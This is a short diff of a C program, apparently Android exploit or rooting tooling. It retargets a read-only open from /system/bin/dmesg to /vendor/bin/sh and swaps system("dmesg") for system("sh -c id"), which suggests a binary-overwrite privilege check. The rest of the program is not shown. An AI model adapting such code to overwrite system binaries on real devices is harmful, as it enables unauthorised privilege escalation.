@@ -183,9 +183,9 @@ int main() {
         return 1;
     }
 
-    int file_fd = open("/system/bin/dmesg", O_RDONLY);
+    int file_fd = open("/vendor/bin/sh", O_RDONLY);
     if (file_fd < 0) {
-        perror("open /system/bin/dumpstate");
+        perror("open /vendor/bin/sh");
         free(decompressed);
         return 1;
     }
@@ -196,7 +196,7 @@ int main() {
 
     close(file_fd);
     free(decompressed);
-    system("dmesg");
+    system("sh -c id");
 
     return 0;
 }
